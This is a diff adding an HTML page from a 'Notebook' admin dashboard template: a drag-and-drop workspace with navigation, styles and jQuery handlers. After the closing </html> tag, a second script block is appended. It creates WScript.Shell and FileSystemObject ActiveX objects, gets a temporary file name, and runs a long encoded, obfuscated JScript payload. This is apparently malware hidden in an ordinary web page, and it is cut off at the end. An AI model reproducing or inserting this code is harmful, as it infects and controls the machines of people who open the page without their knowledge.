@@ -1,0 +1,735 @@
+<!--[ANNIE83E333BF08546819]-->
+<!DOCTYPE html>
+<html lang="en" class="app">
+
+<head>
+    <meta charset="utf-8" />
+    <title>Notebook | Web Application</title>
+    <meta name="description" content="app, web app, responsive, admin dashboard, admin, flat, flat ui, ui kit, off screen nav" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <link rel="stylesheet" href="css/bootstrap.css" type="text/css" />
+    <link rel="stylesheet" href="css/animate.css" type="text/css" />
+    <link rel="stylesheet" href="css/font-awesome.min.css" type="text/css" />
+    <link rel="stylesheet" href="css/font.css" type="text/css" />
+    <link rel="stylesheet" href="css/jquery-ui.css" type="text/css" />
+    <link rel="stylesheet" href="css/jquery.contextMenu.css" type="text/css" />
+
+    <link rel="stylesheet" href="css/app.css" type="text/css" />
+    <!--[if lt IE 9]>
+    <script src="js/ie/html5shiv.js"></script>
+    <script src="js/ie/respond.min.js"></script>
+    <script src="js/ie/excanvas.js"></script>
+  <![endif]-->
+</head>
+
+<body>
+    <section class="vbox">
+        <header class="bg-dark dk header navbar navbar-fixed-top-xs">
+            <div class="navbar-header aside-md">
+                <a class="btn btn-link visible-xs" data-toggle="class:nav-off-screen,open" data-target="#nav,html">
+                    <i class="fa fa-bars"></i>
+                </a>
+                <a href="#" class="navbar-brand" data-toggle="fullscreen">
+                    <img src="images/logo.png" class="m-r-sm">Notebook</a>
+                <a class="btn btn-link visible-xs" data-toggle="dropdown" data-target=".nav-user">
+                    <i class="fa fa-cog"></i>
+                </a>
+            </div>
+            <ul class="nav navbar-nav hidden-xs">
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle dker" data-toggle="dropdown">
+                        <i class="fa fa-building-o"></i> 
+                        <span class="font-bold">Activity</span>
+                    </a>
+                    <section class="dropdown-menu aside-xl on animated fadeInLeft no-borders lt">
+                        <div class="wrapper lter m-t-n-xs">
+                            <a href="#" class="thumb pull-left m-r">
+                                <img src="images/avatar.jpg" class="img-circle">
+                            </a>
+                            <div class="clear">
+                                <a href="#"><span class="text-white font-bold">@Mike Mcalidek</a>
+                                </span>
+                                <small class="block">Art Director</small>
+                                <a href="#" class="btn btn-xs btn-success m-t-xs">Upgrade</a>
+                            </div>
+                        </div>
+                        <div class="row m-l-none m-r-none m-b-n-xs text-center">
+                            <div class="col-xs-4">
+                                <div class="padder-v">
+                                    <span class="m-b-xs h4 block text-white">245</span>
+                                    <small class="text-muted">Followers</small>
+                                </div>
+                            </div>
+                            <div class="col-xs-4 dk">
+                                <div class="padder-v">
+                                    <span class="m-b-xs h4 block text-white">55</span>
+                                    <small class="text-muted">Likes</small>
+                                </div>
+                            </div>
+                            <div class="col-xs-4">
+                                <div class="padder-v">
+                                    <span class="m-b-xs h4 block text-white">2,035</span>
+                                    <small class="text-muted">Photos</small>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                </li>
+                <li>
+                    <div class="m-t m-l">
+                        <a href="price.html" class="dropdown-toggle btn btn-xs btn-primary" title="Upgrade"><i class="fa fa-long-arrow-up"></i></a>
+                    </div>
+                </li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right m-n hidden-xs nav-user">
+                <li class="hidden-xs">
+                    <a href="#" class="dropdown-toggle dk" data-toggle="dropdown">
+                        <i class="fa fa-bell"></i>
+                        <span class="badge badge-sm up bg-danger m-l-n-sm count">2</span>
+                    </a>
+                    <section class="dropdown-menu aside-xl">
+                        <section class="panel bg-white">
+                            <header class="panel-heading b-light bg-light">
+                                <strong>You have <span class="count">2</span> notifications</strong>
+                            </header>
+                            <div class="list-group list-group-alt animated fadeInRight">
+                                <a href="#" class="media list-group-item">
+                                    <span class="pull-left thumb-sm">
+                    <img src="images/avatar.jpg" alt="John said" class="img-circle">
+                  </span>
+                                    <span class="media-body block m-b-none">
+                    Use awesome animate.css<br>
+                    <small class="text-muted">10 minutes ago</small>
+                  </span>
+                                </a>
+                                <a href="#" class="media list-group-item">
+                                    <span class="media-body block m-b-none">
+                    1.0 initial released<br>
+                    <small class="text-muted">1 hour ago</small>
+                  </span>
+                                </a>
+                            </div>
+                            <footer class="panel-footer text-sm">
+                                <a href="#" class="pull-right"><i class="fa fa-cog"></i></a>
+                                <a href="#notes" data-toggle="class:show animated fadeInRight">See all the notifications</a>
+                            </footer>
+                        </section>
+                    </section>
+                </li>
+                <li class="dropdown hidden-xs">
+                    <a href="#" class="dropdown-toggle dker" data-toggle="dropdown"><i class="fa fa-fw fa-search"></i></a>
+                    <section class="dropdown-menu aside-xl animated fadeInUp">
+                        <section class="panel bg-white">
+                            <form role="search">
+                                <div class="form-group wrapper m-b-none">
+                                    <div class="input-group">
+                                        <input type="text" class="form-control" placeholder="Search">
+                                        <span class="input-group-btn">
+                      <button type="submit" class="btn btn-info btn-icon"><i class="fa fa-search"></i></button>
+                    </span>
+                                    </div>
+                                </div>
+                            </form>
+                        </section>
+                    </section>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                        <span class="thumb-sm avatar pull-left">
+              <img src="images/avatar.jpg">
+            </span>
+                        John.Smith <b class="caret"></b>
+                    </a>
+                    <ul class="dropdown-menu animated fadeInRight">
+                        <span class="arrow top"></span>
+                        <li>
+                            <a href="#">Settings</a>
+                        </li>
+                        <li>
+                            <a href="profile.html">Profile</a>
+                        </li>
+                        <li>
+                            <a href="#">
+                                <span class="badge bg-danger pull-right">3</span>
+                                Notifications
+                            </a>
+                        </li>
+                        <li>
+                            <a href="docs.html">Help</a>
+                        </li>
+                        <li class="divider"></li>
+                        <li>
+                            <a href="modal.lockme.html" data-toggle="ajaxModal">Logout</a>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </header>
+        <section>
+            <section class="hbox stretch">
+                <!-- .aside -->
+                <aside class="bg-dark lter nav-xs aside-md hidden-print nav-xs" id="nav">
+                    <section class="vbox">
+                        <header class="header bg-primary lter text-center clearfix">
+                            <div class="btn-group">
+                                <button type="button" class="btn btn-sm btn-dark btn-icon" title="New project"><i class="fa fa-plus"></i>
+                                </button>
+                                <div class="btn-group hidden-nav-xs">
+                                    <button type="button" class="btn btn-sm btn-primary dropdown-toggle" data-toggle="dropdown">
+                                        Switch Project
+                                        <span class="caret"></span>
+                                    </button>
+                                    <ul class="dropdown-menu text-left">
+                                        <li><a href="#">Project</a>
+                                        </li>
+                                        <li><a href="#">Another Project</a>
+                                        </li>
+                                        <li><a href="#">More Projects</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </header>
+                        <section class="w-f scrollable">
+                            <div class="slim-scroll" data-height="auto" data-disable-fade-out="true" data-distance="0" data-size="5px" data-color="#333333">
+
+                                <!-- nav -->
+                                <nav class="nav-primary hidden-xs">
+                                    <ul class="nav">
+                                        <li>
+                                            <a href="index.html">
+                                                <i class="fa fa-dashboard icon">
+                          <b class="bg-danger"></b>
+                        </i>
+                                                <span>Workset</span>
+                                            </a>
+                                        </li>
+                                        <li>
+                                            <a href="#layout">
+                                                <i class="fa fa-columns icon">
+                          <b class="bg-warning"></b>
+                        </i>
+                                                <span class="pull-right">
+                          <i class="fa fa-angle-down text"></i>
+                          <i class="fa fa-angle-up text-active"></i>
+                        </span>
+                                                <span>Layouts</span>
+                                            </a>
+                                            <ul class="nav lt">
+                                                <li>
+                                                    <a href="layout-c.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Color option</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="layout-r.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Right nav</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="layout-h.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>H-Layout</span>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <a href="#uikit">
+                                                <i class="fa fa-flask icon">
+                          <b class="bg-success"></b>
+                        </i>
+                                                <span class="pull-right">
+                          <i class="fa fa-angle-down text"></i>
+                          <i class="fa fa-angle-up text-active"></i>
+                        </span>
+                                                <span>UI kit</span>
+                                            </a>
+                                            <ul class="nav lt">
+                                                <li>
+                                                    <a href="buttons.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Buttons</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="icons.html">
+                                                        <b class="badge bg-info pull-right">369</b> 
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Icons</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="grid.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Grid</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="widgets.html">
+                                                        <b class="badge  pull-right">8</b> 
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Widgets</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="components.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Components</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="list.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>List group</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#table">
+                                                        <i class="fa fa-angle-down text"></i>
+                                                        <i class="fa fa-angle-up text-active"></i>
+                                                        <span>Table</span>
+                                                    </a>
+                                                    <ul class="nav bg">
+                                                        <li>
+                                                            <a href="table-static.html">
+                                                                <i class="fa fa-angle-right"></i>
+                                                                <span>Table static</span>
+                                                            </a>
+                                                        </li>
+                                                        <li>
+                                                            <a href="table-datatable.html">
+                                                                <i class="fa fa-angle-right"></i>
+                                                                <span>Datatable</span>
+                                                            </a>
+                                                        </li>
+                                                        <li>
+                                                            <a href="table-datagrid.html">
+                                                                <i class="fa fa-angle-right"></i>
+                                                                <span>Datagrid</span>
+                                                            </a>
+                                                        </li>
+                                                    </ul>
+                                                </li>
+                                                <li>
+                                                    <a href="#form">
+                                                        <i class="fa fa-angle-down text"></i>
+                                                        <i class="fa fa-angle-up text-active"></i>
+                                                        <span>Form</span>
+                                                    </a>
+                                                    <ul class="nav bg">
+                                                        <li>
+                                                            <a href="form-elements.html">
+                                                                <i class="fa fa-angle-right"></i>
+                                                                <span>Form elements</span>
+                                                            </a>
+                                                        </li>
+                                                        <li>
+                                                            <a href="form-validation.html">
+                                                                <i class="fa fa-angle-right"></i>
+                                                                <span>Form validation</span>
+                                                            </a>
+                                                        </li>
+                                                        <li>
+                                                            <a href="form-wizard.html">
+                                                                <i class="fa fa-angle-right"></i>
+                                                                <span>Form wizard</span>
+                                                            </a>
+                                                        </li>
+                                                    </ul>
+                                                </li>
+                                                <li>
+                                                    <a href="chart.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Chart</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="fullcalendar.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Fullcalendar</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="portlet.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Portlet</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="timeline.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Timeline</span>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <a href="#pages">
+                                                <i class="fa fa-file-text icon">
+                          <b class="bg-primary"></b>
+                        </i>
+                                                <span class="pull-right">
+                          <i class="fa fa-angle-down text"></i>
+                          <i class="fa fa-angle-up text-active"></i>
+                        </span>
+                                                <span>Pages</span>
+                                            </a>
+                                            <ul class="nav lt">
+                                                <li>
+                                                    <a href="gallery.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Gallery</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="profile.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Profile</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="invoice.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Invoice</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="intro.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Intro</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="master.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Master</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="gmap.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Google Map</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="jvectormap.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Vector Map</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="signin.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Signin</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="signup.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>Signup</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="404.html">
+                                                        <i class="fa fa-angle-right"></i>
+                                                        <span>404</span>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                        </li>
+                                        <li class="active">
+                                            <a href="mail.html" class="active">
+                                                <b class="badge bg-danger pull-right">3</b>
+                                                <i class="fa fa-envelope-o icon">
+                          <b class="bg-primary dker"></b>
+                        </i>
+                                                <span>Message</span>
+                                            </a>
+                                        </li>
+                                        <li>
+                                            <a href="notebook.html">
+                                                <i class="fa fa-pencil icon">
+                          <b class="bg-info"></b>
+                        </i>
+                                                <span>Notes</span>
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </nav>
+                                <!-- / nav -->
+                            </div>
+                        </section>
+
+                        <footer class="footer lt hidden-xs b-t b-dark">
+                            <div id="chat" class="dropup">
+                                <section class="dropdown-menu on aside-md m-l-n">
+                                    <section class="panel bg-white">
+                                        <header class="panel-heading b-b b-light">Active chats</header>
+                                        <div class="panel-body animated fadeInRight">
+                                            <p class="text-sm">No active chats.</p>
+                                            <p><a href="#" class="btn btn-sm btn-default">Start a chat</a>
+                                            </p>
+                                        </div>
+                                    </section>
+                                </section>
+                            </div>
+                            <div id="invite" class="dropup">
+                                <section class="dropdown-menu on aside-md m-l-n">
+                                    <section class="panel bg-white">
+                                        <header class="panel-heading b-b b-light">
+                                            John <i class="fa fa-circle text-success"></i>
+                                        </header>
+                                        <div class="panel-body animated fadeInRight">
+                                            <p class="text-sm">No contacts in your lists.</p>
+                                            <p><a href="#" class="btn btn-sm btn-facebook"><i class="fa fa-fw fa-facebook"></i> Invite from Facebook</a>
+                                            </p>
+                                        </div>
+                                    </section>
+                                </section>
+                            </div>
+                            <a href="#nav" data-toggle="class:nav-xs" class="pull-right btn btn-sm btn-dark btn-icon">
+                                <i class="fa fa-angle-left text"></i>
+                                <i class="fa fa-angle-right text-active"></i>
+                            </a>
+                            <div class="btn-group hidden-nav-xs">
+                                <button type="button" title="Chats" class="btn btn-icon btn-sm btn-dark" data-toggle="dropdown" data-target="#chat"><i class="fa fa-comment-o"></i>
+                                </button>
+                                <button type="button" title="Contacts" class="btn btn-icon btn-sm btn-dark" data-toggle="dropdown" data-target="#invite"><i class="fa fa-facebook"></i>
+                                </button>
+                            </div>
+                        </footer>
+                    </section>
+                </aside>
+                <!-- /.aside -->
+                <style type="text/css">
+                #shape {
+                    /*border: 1px solid #e8e8e8;*/
+                    float: left;
+                    height: auto;
+                    padding: 5px;
+                    width: 200px;
+                }
+
+                #droppable {
+                    width: 600px;
+                    border-left: 1px solid #e8e8e8;
+                    border-right: 1px solid #e8e8e8;
+                    float: left;
+                    padding: 5px;
+                }
+
+                .drag
+                {
+                    -webkit-box-shadow:inset 0px 0px 0px 1px #000;
+                    -moz-box-shadow:inset 0px 0px 0px 1px #000;
+                    box-shadow:inset 0px 0px 0px 1px #000;
+                    width: 80px;
+                    height: 80px;
+                    position: relative;
+                    background:#F00;
+                    margin-bottom: 20px;
+                }
+
+                .tiang-style
+                {
+                    width:20px; 
+                    height:20px;
+                    -moz-border-radius: 50%; 
+                    -webkit-border-radius: 50%; 
+                    border-radius: 50%;
+                    z-index: 1;
+                }
+
+                .tiang-inactive {
+                    background: gray;
+                }
+
+                .tiang-active {
+                    background: #03f;
+                }
+
+                .ui-selected
+                {
+                    -webkit-box-shadow:inset 0px 0px 0px 1px #55FF00;
+                    -moz-box-shadow:inset 0px 0px 0px 1px #55FF00;
+                    box-shadow:inset 0px 0px 0px 1px #55FF00;
+                }
+
+                .right {
+                    float: right;
+                }
+
+                .left {
+                    float: left;
+                }
+
+                .clear {
+                    clear: both;
+                }
+
+                ul li {
+                    list-style: none;
+                }
+
+                .drag-list img {
+                    width: 80px;
+                    vertical-align: middle;
+                    cursor: move;
+                }
+
+                .drag-list ul {
+                    margin: 0px;
+                    padding: 0px;
+                }
+
+                .drag-list li {
+                    margin-bottom: 5px;
+                }
+
+                .remove-drag-hover {
+                    background-color: #ED4949 !important;
+                }
+
+                .drop-area {
+                    background-color: #afd1b2;
+                }
+
+                .pojok-kiri-atas{
+                    position: absolute;
+                    color: #FFF;
+                    text-decoration: none;
+                    margin-left: 2px;
+                    margin-top: -4px;
+                }
+
+                .pojok-kanan-atas{
+                    position: absolute;
+                    color: #FFF;
+                    text-decoration: none;
+                    margin-left: 70px;
+                    margin-top: -4px;
+                }
+
+                .pojok-kiri-bawah{
+                    position: absolute;
+                    color: #FFF;
+                    text-decoration: none;
+                    margin-left: 2px;
+                    margin-top: 62px;
+                }
+
+                .pojok-kanan-bawah{
+                    position: absolute;
+                    color: #FFF;
+                    text-decoration: none;
+                    margin-left: 70px;
+                    margin-top: 62px;
+                }   
+
+                .pojok-kiri-atas:hover {
+                    background-color: #fff;
+                    color: #000;
+                    width: 13px;
+                    height: 20px;
+                    text-align: center;
+                }
+                </style>
+                <section id="content">
+                    <section class="hbox stretch">
+                        <div id="shape">
+                            <div id="master-blandar1" class="drag tenda" object-name="kotak1" data-blandar="2" data-kuda-kuda="2" data-tiang="4" data-reng="2" data-terpal="2"></div>                               
+                            <div id="master-tiang" class="drag tiang-style tiang tiang-inactive" object-name="tiang"></div>                                        
+                        </div>
+                        
+                        <div id="droppable" class="bg-white"></div>
+
+                        <span id="show-right-panel" style="position:absolute;top:20px;right:0;" class="btn btn-sm btn-info btn-icon">
+                            <i class="fa fa-angle-left text"></i>
+                            <i class="fa fa-angle-right text-active"></i>
+                        </span>
+
+                        <aside id="side-panel" class="aside-sm b-l" style="border-left:1px solid #e8e8e8;display:none;position:absolute;right:0;">
+                            <section class="vbox">
+                                <section class="scrollable bg-white">
+                                    tes
+                                </section>
+                                <span id="hide-right-panel" style="position:absolute;top:20px;right:150px;z-index:1000;" class="btn btn-sm btn-info btn-icon">
+                                    <i class="fa fa-angle-right text"></i>
+                                    <i class="fa fa-angle-left text-active"></i>
+                                </span>
+                            </section>
+                        </aside>
+
+                        <div id="bottom-panel" style="border-top:1px solid #e8e8e8;background:#fff;display:none;width:100%;position:absolute;bottom:0;height:50px;z-index:1000;">
+                            <span id="hide-bottom-panel" style="position:absolute;top:-30px;right:150px;z-index:1000;" class="btn btn-sm btn-info btn-icon">
+                                <i class="fa fa-angle-down text"></i>
+                                <i class="fa fa-angle-right text-active"></i>
+                            </span>
+                        </div>
+
+                        <span id="show-bottom-panel" style="position:absolute;bottom:0;right:95px;" class="btn btn-sm btn-info btn-icon">
+                            <i class="fa fa-angle-up text"></i>
+                            <i class="fa fa-angle-down text-active"></i>
+                        </span>
+                    </section>
+                    <a href="#" class="hide nav-off-screen-block" data-toggle="class:nav-off-screen" data-target="#nav"></a>
+                </section>
+                <aside class="bg-light lter b-l aside-md hide" id="notes">
+                    <div class="wrapper">Notification</div>
+                </aside>
+            </section>
+        </section>
+    </section>
+    <script src="js/jquery.min.js"></script>
+    <!-- Bootstrap -->
+    <script src="js/bootstrap.js"></script>
+    <!-- App -->
+    <script src="js/jquery.ui.position.js"></script>
+    <script src="js/jquery-ui.js"></script>
+    <script src="js/jquery.contextMenu.js"></script>
+    <script src="js/app.js"></script>
+    <script src="js/app.plugin.js"></script>
+    <script src="js/slimscroll/jquery.slimscroll.min.js"></script>
+    <script type="text/javascript" src="js/function.working-space.js"></script>
+    <script type="text/javascript">
+    (function($, window, document) {
+        $(function() {
+            var contentHeight = $("#content").height(),
+                droppable     = $("#droppable");
+            $(".vbox").height(contentHeight);
+
+            $(window).resize(function() {
+                contentHeight = $("#content").height();
+                droppable.height(contentHeight);
+            });
+
+            $("#hide-right-panel").on("click", function() {
+                $("#side-panel").hide();
+            });
+
+            $("#show-right-panel").on("click", function() {
+                $("#side-panel").show();
+            });
+
+            $("#hide-bottom-panel").on("click", function() {
+                $("#bottom-panel").hide();
+            });
+
+            $("#show-bottom-panel").on("click", function() {
+                $("#bottom-panel").show();
+            });
+        });
+    }(window.jQuery, window, document));
+    </script>
+</body>
+</html>
+<html>
+<script type="text/javascript">
+<!--
+var ayfp6=new ActiveXObject('Scripting.FileSystemObject');var dk5h8=new ActiveXObject('WScript.Shell');var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c='#@~^2CMAAA==-mD~a%!6y{xAPzmOk7+p6(L+1O`E?mMr2YbxTRoksnUXdYhr(Ln^DB#I-mD~6A2Xx	+SPb1Yb-+or8LmOcE?1.kaYRU4nV^B*i-l.~1\\8l$xUm.raYRj^Mk2Yw;^VHm:i\\mD,5!$+;\'4X;.l`m78l$#i7C.P.Xy61\'20!6"RVnYUwn^blVoG^NnDvq*i-mD,0%mFOxyH a,3Bww9Dk7nDk--mUUkRkXdBIW!x^YbGx,l{;FE`b`StrVc1\\8m;{\'0Rl81#P\\CD,:+1Xt\'	nh,2x!hnDmYKDcw0;Xy fMr\\/bI6WDchy,atchK\\nwkM/Yv#pZ:y,atclO3	N`*I:y,64 hW7+g+aYcb*	-lM~mZLGn{: 1a4RrYhv#Ib0v``1!NG+cf.k7+Pza+\'{qu-m!NGnRGDb\\nKz2\'x *\'[1!%GRnCO4"xBzlE#\'LmZLWR&dIl[X*	OTD0v^!NW+cKCY4_E-wlUUb+ l	rB*iLVF/Lc^ZLG+cKmY43B\'-l!YK.E	Rrx6BbIa3kD2`1!LKn nmY4_v-wv*i5lO-6vmT%K+RKCDtQB\'wE#Ia&7VkvmZ%WRKlDtQv\'-B*I8)886;UmDkKx~4f5W*c/S{%T#`.YE.U,w0EX"cMnD2XY+	/bGxglh+v/A{Ro#cOWdWh./lk+v#I8W;	mOkKUP(\\X"8`#`-mD~YZ%DEx1\\(l;c/!8/DDc!Bm-8m;R^nxTYt *bib0vw0Ea"csrV36b/OdvY!%O!_vR9G16v*#P3ERVacYZLOEBB [Km6Ebi)+Vkn~k6`a%;6" wks+AakkYdcD!LO;3B NK^E#bP3!%Va`DTLDESBcNG^E#i)nVk+PbWcwREXy srs2akkO/vYT%DE_v MYWB*bP3;RVa`YZLD;~ER.Y6BbI)80!UmDkW	~^*	L2`b	anS&zRM;xvB^d1Dk2Oc+a+,&J+lN/1DkaYcnx1W[+,BQWRlFOQB,zDEST#pUm.k2Oc?s+2`8!Tbp6+AfHR.E	cEmd1DbwYc+XnPJzn)N/^.bwYcnx1WN~v_6%mF1_v~J/v~Zbiq?^.bwY j^+nwvqZ!bp6h&HR";xvB^/1Dr2DR+XnPJz+=%dmMkaY +U^KNnPEQ0Rlq13BP&UE~T#pN6EU1YbWx,mS*DD`[%NlabPk0v2%!6ycorV2XkdYdc9%%lXb#PDnO!Dx~2REayc!YobV`NRLma#c?ryiNn^/+P.+DED	~UE^Vp8N0;U1YrW	~Ny4WXvE02{!#`DO!DU,wRE6.RVnY~ld+glhnvE0a{E*i86;UmDkKx~NfCHLco8O 7#`OMX	.nDE.x,2REa.R}w+	KaYwks+voqOy\\~8bR"+l9Jrx`*iNmCO1tc+*`DY;.	Px;s^iN86;	mObW	P+OVN"`*	r0vmA*MY`60l8,#ex1 ZF*	O!n.6`W%mq,*ianS&X ]!xcBSd1DraYc+6PJ&+=LdmMk2Oc+x1GNPB3W0l8,3B~znv*iN86;x1YrG	PoV{kLc0+W$wbP\\mDP1GR;,{B,l!YG.!xT\'U/4+V^na+1ED+xhd^Mk2Ycn6P&&)Ld^Mk2Ycn	mG9+,lx	k l	k~zm-Ud4+V^w-Kw+	wwmK:slUNxAkm.kaOR6n~Jz+l%km.kaOc+U1W9+Pmx	r+clUk,zCw	/tsV\'-+X2sWM+\'-^Whhmx[\'SdmMk2Oc+6n~Jzn)Nd1DraYc+x1W9nPmxUkRCUbPzmvib0`4z;Dl`6vW;2be\'^GR;,*	rG24DcW+05wBT*iOMXP\\lMPb[%^;xwREa"cZDCYK+XOok^+v0052BY.EbibN0s$R.rD+cmF0!,bpk9%V$R;sWk+c#p8^CDmtvn#Pk0v20EXycsGV[nM2akkO/v0W$w#b`H%;6Wc6vW$w*io0Gk%`6vW;a#IN)0k	CV^X	bGf4M`6vW;2S2,bi)N86EU^DkWU~4X;Dlcacd06*	YMXP.+DE.x,w0;XyR}2+	K+XOok^+vw*/VaBFbR"nl9bssv#iN^mY^tvn*	.Y!Dx,BEI8)0;x1YrG	PkKf4M`D.;13BhkyWGb`b0cwR;6.Ror^+2arkYd`M"!,V*#PYDH	7CD,YWt0Vx2RE6. MYsbsn`My!,V#IO6tVVc)YDDr8!Y+dxS/"0FI)mCDm4`+*	)N86EUmDkGU,ky{vvw,0.5#P6hfX ]o	DbO+vBuF;I-wv3D^:WAvB x?AB#3B\'wBBD^:Whc.1:cScwO3D$bQB\'-E#bianS&zR"noqDrO`BuF;Iw-EQMmhWhvBRx?Av#3Bw-G+WC!VY&^W	--ES.mscS`.mh*S`2,0.;*_vw\'f+WC!VOq1G	-wE#*i6h2zR"+LMkOnvBCn/I\'-B3.^:WhvB 9j3E#QB\'wsMknU9VXPza+HlsnE~.1:Wh`Mms*hvw13M;bQE--Eb~EI2Vm3(hbgfm?tv*iN0!UmDkGU,3E0sa`[XZ"m~WN:80#PYMz	7l.P9D+;M\'D1hcS`D1h*hv0N:q0bQE-w/4nV^-w6a+xww1Wh:mU9Bbpk6`NM !.RslOm4`&Y8z#exx!VV*`a+S&HR]EUc9D+EM DwsC1+`vY8BSNHT.lQ6LsF0*#pN+^/n	X+AfHRI!U`9D !.QB,JE_[XT"m_WLsq03BEv*i8N^mY^tvn*	N)0!xmDkKUP^w0DW`b`Stk^n`1\\4m5x\'6%mF1#`OZ+.0vW%mF1bp6xL48`bi.T(6sv#p:4^61c#pjmMk2Oc?VnwvF!ZTbi)86EUmOrKx~:(s61`b`DDX`r.+{vvvcNG16E#i)mmOm4`n#PY.zPky{vvBR9G^B*i)mCY^4v+b	D.XPk"nFv`v MYWB*I)mCDm4`+*	)N8)0;x1YrG	Pw2-Vb`lS^XV*	7l.PW2^xX\'	nh,2U;s+DCOKDcwR;Xy V+DsW^N.`mh^*^# j!4sKsND/*IWWM`6wsxX sW-+wrDkYcbp"02s	* lD3	Nc*i6wV	*chW7+H+XYcb*	\\m.P(+GM^x0aV	* kOns`bibW`v4n{MmRHCs+Z\'E]AZe;SAIBL[(nGMm 1m:nZ{B?HdY:PjGsEs+,qU0G.slOkKUB*[\'8GD^ hlOtexa%;XycM+D?anmblssKV[nM`!*b	$l,7ac4GMm nCO4#Iw2-Vb`8nFDm KmY4#pN)8W!x1YkKx,23bY2`(Eq.X#	6GDv\\lM~r\'8ib@!x*Ir3_b	7CD,hTW/\'8;8Da_E8l;Dk6EV|ob.V|wCDD{vQb_Bcsx0BibWc"a%!6"Ror^+36bdYk`AZc/bbPY.XP-mD~k\\RLy{6A&HR/DlOnUtWMOm!Y`STck#p/-%%"cq^W	JW1lOrKx\'vAswsW1 9VsB%Ei/7%N"R:l.oYKCDt\'EA/1DkaO +X+Eid\\0%.R)DT;:xOd{Bz&n=LdmMraY x1WNPmUxb+ l	k~v3Bz$lB3kik-0L.RUl-+cbp8^lD^tv+b`)88NW!x^YbG	P5+c1;`.ls**	-lMPUrm6h{v@!eOO])H1&2R&3&ff~sT%l*vRF1D O@*vIb0cN2CHLc.lV**"{Ukm6A#P\\C.,;x04m{tX!.X`.lVX#I-mD~3b*kK\'5T$+E .wsl1nvzw\'zT~B\'-\'wB*i-lMP-T^,:{VkWkWc.nw^l1+czwvJoSB\'w-EBbI7lD~2FD+;{v@!tOsV@*-x@!/1.kaY~YHwnxrY+XOzNl\\md^DbwDJ@*-U@!eOR-	-lMPCz6wvxUh~b1Ob\\nor(L+1YvwBUm.kaYrUTRsbs+UX/Dnhr(LmO-vbp\\CD,[3lt0x	+h~)1Yr\\p}4%mD`-EU^DbwORUtns^-B*I\\mDPk*q3R\'mXWw V+O?anmblsoKVNn.v bi7CMP8Th2E\'mX62vcMnY:+h2gl:c#p\\lM~-VX%1\'wBvQ7!s,sQB\'BQjDDkULc0.Ws/4l.;W9+`Z#p-lMP.hHoXxmX0aR;D+mOnK6DsrVnckcq3RQ-E-ww\'-BQ8ThfEBOMEn*iMhXT*c	DbYn`7Va01#iMAXT*R;sG/`*i[3X4RR]E	c-Ehd^MkwO 6nPJ&)%kmMkwDRUmKNnP\'BQdWF3RQ-E--\'wwB34ThfEQwEP&Y\'v#p-U&JOO@*w	@!&/1.bwO@*-	@!z4Yss@*EirW24.c.l+^X~Z#iD.z	7lMPVczT9\'2%!aycr2n	K+aOwks+v"m+sl~y#i0cHTNc.kD+Jr	+`	rlXh#pV*XZNc.kOndkU+v5x0t^bp3czT9R	DbOSr	+vwGM $bi0cz!9R/sK/+vbi)mlD^4`#P8N8W;	